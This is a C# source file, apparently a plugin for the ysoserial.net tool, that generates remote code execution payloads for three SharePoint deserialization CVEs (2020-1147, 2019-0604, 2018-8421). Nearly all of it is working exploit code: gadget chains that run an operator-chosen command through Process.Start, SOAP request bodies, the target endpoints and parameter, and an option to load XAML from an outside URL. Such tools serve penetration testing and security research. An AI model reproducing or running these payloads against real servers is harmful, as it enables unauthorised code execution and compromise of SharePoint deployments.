using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using ysoserial.Generators;
using ysoserial.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  This plugin generates payloads that can be used for a few SharePoint vulnerabilities that are related to deserialization.
 *  Please feel free to contribute to this and add your name at the top.
 *  It currently supports:
 *      CVE-2020-1147: https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html
 *      CVE-2019-0604: https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
 *      CVE-2018-8421: https://www.nccgroup.trust/uk/our-research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-mechanisms-using-deserialisation-of-untrusted-data/
 **/

namespace ysoserial.Plugins
{
    public class SharePointPlugin : IPlugin
    {
        static string cve = "";
        static string gadget = "TypeConfuseDelegate";
        static string command = "";
        static bool useurl = false;

        static OptionSet options = new OptionSet()
            {
                {"cve=", "the CVE reference: CVE-2020-1147 (result is safe for a POST request), CVE-2019-0604, CVE-2018-8421", v => cve = v },
                {"useurl", "to use the XAML url rather than using the direct command in CVE-2019-0604 and CVE-2018-8421", v => useurl = v != null },
                {"g|gadget=", "a gadget chain that supports LosFormatter for CVE-2020-1147. Default: TypeConfuseDelegate ", v => gadget = v },
                {"c|command=", "the command to be executed e.g. \"cmd /c calc\" or the XAML url e.g. \"http://b8.ee/x\" to make the payload shorter with the `--useurl` argument", v => command = v },
            };

        public string Name()
        {
            return "SharePoint";
        }

        public string Description()
        {
            return "Generates payloads for the following SharePoint CVEs: CVE-2020-1147, CVE-2019-0604, CVE-2018-8421";
        }

        public string Credit()
        {
            return "CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {

            List<string> extra;
            try
            {
                extra = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }
            string payload = "";

            if (String.IsNullOrEmpty(cve) || String.IsNullOrWhiteSpace(cve) || String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            switch (cve.ToLower())
            {
                case "cve-2018-8421":
                    payload = CVE_2018_8421();
                    payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                "https://www.nccgroup.trust/uk/our-research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-mechanisms-using-deserialisation-of-untrusted-data/" +
                                "\r\n-->";

                    break;
                case "cve-2019-0604":
                    payload = CVE_2019_0604();
                    payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                "https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability" +
                                "\r\n-->";
                    break;
                case "cve-2020-1147":
                    payload = CVE_2020_1147();
                    payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                "https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html" +
                                "\r\n The payload needs to be sent (POST request) in the __SUGGESTIONSCACHE__ parameter to /_layouts/15/quicklinks.aspx?Mode=Suggestion or /_layouts/15/quicklinksdialogform.aspx?Mode=Suggestion " +
                                "\r\n-->";
                    break;
            }

            if (String.IsNullOrEmpty(payload))
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            return payload;
        }

        public string CVE_2020_1147()
        {
            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = command;
            inputArgs.IsRawCmd = true;
            inputArgs.Minify = false; // minimisation of payload is not important here but we can do it if needed!
            inputArgs.UseSimpleType = false; // minimisation of payload is not important here but we can do it if needed!

            string formatter = "losformatter";
            string losFormatterPayload = "";
            
            var types = AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes());
            // Populate list of available gadgets
            var generatorTypes = types.Where(p => typeof(IGenerator).IsAssignableFrom(p) && !p.IsInterface);
            var generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList();

            if (!generators.Contains(gadget))
            {
                Console.WriteLine("Gadget not supported.");
                System.Environment.Exit(-1);
            }

            // Instantiate Payload Generator
            IGenerator generator = null;
            try
            {
                var container = Activator.CreateInstance(null, "ysoserial.Generators." + gadget + "Generator");
                generator = (IGenerator)container.Unwrap();
            }
            catch
            {
                Console.WriteLine("Gadget not supported!");
                System.Environment.Exit(-1);
            }

            // Check Generator supports specified formatter
            if (generator.IsSupported(formatter))
            {
                losFormatterPayload = System.Text.Encoding.ASCII.GetString((byte[])generator.GenerateWithNoTest(formatter, inputArgs));
            }
            else
            {
                Console.WriteLine("LosFormatter not supported.");
                System.Environment.Exit(-1);
            }

            string payload = @"<DataSet>
  <xs:schema xmlns="""" xmlns:xs=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"" id=""somedataset"">
    <xs:element name=""somedataset"" msdata:IsDataSet=""true"" msdata:UseCurrentLocale=""true"">
      <xs:complexType>
        <xs:choice minOccurs=""0"" maxOccurs=""unbounded"">
          <xs:element name=""Exp_x0020_Table"">
            <xs:complexType>
              <xs:sequence>
                <xs:element name=""pwn"" msdata:DataType=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" type=""xs:anyType"" minOccurs=""0""/>
              </xs:sequence>
            </xs:complexType>
          </xs:element>
        </xs:choice>
      </xs:complexType>
    </xs:element>
  </xs:schema>
  <diffgr:diffgram xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"" xmlns:diffgr=""urn:schemas-microsoft-com:xml-diffgram-v1"">
    <somedataset>
      <Exp_x0020_Table diffgr:id=""Exp Table1"" msdata:rowOrder=""0"" diffgr:hasChanges=""inserted"">
        <pwn xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Deserialize</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">"+ losFormatterPayload + @"</anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""LosFormatter""></ObjectInstance>
        </ProjectedProperty0>
        </pwn>
      </Exp_x0020_Table>
    </somedataset>
  </diffgr:diffgram>
</DataSet>";

            // minimisation of payload is not important here but we can do it if needed!

            return payload.Replace("+","%2B").Replace("&","%26"); // POST body safe (minimal url-encoding)
        }

        public string CVE_2018_8421()
        {

            string payload = "";

            if (useurl)
            {
                payload = @"<?xml version=""1.0"" encoding=""utf-8""?>
<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Body><ValidateWorkflowMarkupAndCreateSupportObjects xmlns=""http://microsoft.com/sharepoint/webpartpages""><workflowMarkupText><![CDATA[
<SequentialWorkflowActivity x:Class=""."" x:Name=""Workflow2"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/workflow"">
<Rd:ResourceDictionary xmlns:Rd=""clr-namespace:System.Windows;Assembly=PresentationFramework,
Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" Source="""+command+@"""/>
</SequentialWorkflowActivity>
]]></workflowMarkupText>
<rulesText></rulesText><configBlob></configBlob><flag>2</flag></ValidateWorkflowMarkupAndCreateSupportObjects></soap:Body></soap:Envelope>";

            }
            else
            {
                Boolean hasArgs;
                string[] splittedCMD = CommandArgSplitter.SplitCommand(command, CommandArgSplitter.CommandType.XML, out hasArgs);

                String cmdPart;

                if (hasArgs)
                {
                    cmdPart = $@"<Diag:ProcessStartInfo FileName=""" + splittedCMD[0] + @""" Arguments=""" + splittedCMD[1] + @""">";
                }
                else
                {
                    cmdPart = $@"<Diag:ProcessStartInfo FileName=""" + splittedCMD[0] + @""">";
                }

                payload = @"<?xml version=""1.0"" encoding=""utf-8""?>
<soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Body><ValidateWorkflowMarkupAndCreateSupportObjects xmlns=""http://microsoft.com/sharepoint/webpartpages""><workflowMarkupText><![CDATA[
<SequentialWorkflowActivity x:Class=""."" x:Name=""Workflow2"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/workflow"">
<Rd:ResourceDictionary xmlns:System=""clr-namespace:System;assembly=mscorlib, Version=4.0.0.0,    
Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=System,
Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:Rd=""clr-namespace:System.Windows;Assembly=PresentationFramework,
Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"" xmlns:ODP=""clr-namespace:System.Windows.Data;Assembly=PresentationFramework, Version=4.0.0.0, Culture=neutral,    
PublicKeyToken=31bf3856ad364e35"">
<ODP:ObjectDataProvider x:Key=""LaunchCmd"" MethodName=""Start"">
<ObjectDataProvider.ObjectInstance><Diag:Process><Diag:Process.StartInfo>" + cmdPart + @"</Diag:ProcessStartInfo></Diag:Process.StartInfo></Diag:Process>
</ObjectDataProvider.ObjectInstance>
</ODP:ObjectDataProvider>
</Rd:ResourceDictionary>
</SequentialWorkflowActivity>
]]></workflowMarkupText>
<rulesText></rulesText><configBlob></configBlob><flag>2</flag></ValidateWorkflowMarkupAndCreateSupportObjects></soap:Body></soap:Envelope>";

            }
            // minimisation of payload is not important here but we can do it if needed!

            return payload;
        }

        private static ushort[] masks = new ushort[] { 15, 240, 3840, 61440 };
        private static char[] hexChars = new char[] { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };

        public string CVE_2019_0604()
        {




            /*
            string payloadPart2 = @"<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xsi:type=""xsd:string"">
                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">"+ cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""XamlReader""></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>";
            //*/

            string payloadPart1 = "";
            string payloadPart2 = "";

            if (useurl)
            {
                InputArgs inputArgs = new InputArgs();
                inputArgs.Cmd = "foobar";
                inputArgs.IsRawCmd = true;
                inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", command};
                inputArgs.Minify = true;
                inputArgs.UseSimpleType = true;

                payloadPart1 = typeof(Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties).AssemblyQualifiedName + ":";
                payloadPart1 = payloadPart1.Replace(" ", "");
                TextFormattingRunPropertiesGenerator myTFRPG = new TextFormattingRunPropertiesGenerator();
                payloadPart2 = (string) myTFRPG.GenerateWithNoTest("DataContractSerializer", inputArgs);

            }
            else
            {
                payloadPart1 = @"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35]],System.Data.Services,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089:";

                Boolean hasArgs;
                string[] splittedCMD = CommandArgSplitter.SplitCommand(command, CommandArgSplitter.CommandType.XML, out hasArgs);

                String cmdPart;

                if (hasArgs)
                {
                    cmdPart = $@"<b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
                }
                else
                {
                    cmdPart = $@"<b:String>{splittedCMD[0]}</b:String>";
                }

                payloadPart2 = @"<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:a=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:b=""http://www.w3.org/2001/XMLSchema""><ExpandedElement/><ProjectedProperty0><MethodName>Parse</MethodName><MethodParameters><anyType a:type=""b:string""><![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start""><ObjectDataProvider.MethodParameters>" + cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]></anyType></MethodParameters><ObjectInstance a:type=""XamlReader""/></ProjectedProperty0></ExpandedWrapperOfXamlReaderObjectDataProvider>";

            }
            //payloadPart2 = PayloadMinifier(payloadPart2); // we need to make it smaller as goes bigger after encoding

            payloadPart2 = XmlHelper.Minify(payloadPart2, null, null, FormatterType.DataContractXML, true);

            //Console.WriteLine(payloadPart2);
            string payload = payloadPart1 + payloadPart2;

            Console.WriteLine(payload);
            StringBuilder stringBuilder = new StringBuilder();

            stringBuilder.Append("__bp");
            HexEncode(checked((char)(payload.Length << 2)), stringBuilder);
            HexEncode(payload, stringBuilder);

            return stringBuilder.ToString();
        }

        /*
        private string PayloadMinifier(string strPayload)
        {
            strPayload = strPayload.Replace("\r\n", "");
            strPayload = strPayload.Replace("\t", "");
            strPayload = Regex.Replace(strPayload, @"[ ]+", " ");
            strPayload = strPayload.Replace("> <", "><");
            strPayload = strPayload.Replace("> &lt;", ">&lt;");
            strPayload = strPayload.Replace("&gt; <", "&gt;<");

            strPayload = strPayload.Replace("xmlns:xsi", "xmlns:a");
            strPayload = strPayload.Replace("xsi:", "a:");

            strPayload = strPayload.Replace("xmlns:xsd", "xmlns:b");
            strPayload = strPayload.Replace("xsd:", "b:");

            strPayload = strPayload.Replace("xmlns:System", "xmlns:c");
            strPayload = strPayload.Replace("System:", "c:");

            strPayload = strPayload.Replace("xmlns:Diag", "xmlns:d");
            strPayload = strPayload.Replace("Diag:", "d:");

            return strPayload;
        }
        */

        private static void HexEncode(string data, StringBuilder buf)
        {
            for (int i = 0; i < data.Length; i = i + 1)
            {
                HexEncode(data[i], buf);
            }
        }

        private static void HexEncode(char chr, StringBuilder buf)
        {
            for (int i = 0; i < 4; i = i + 1)
            {
                buf.Append(hexChars[(chr & (char)masks[i]) >> (i << 2 & 31)]);
            }
        }
    }
}
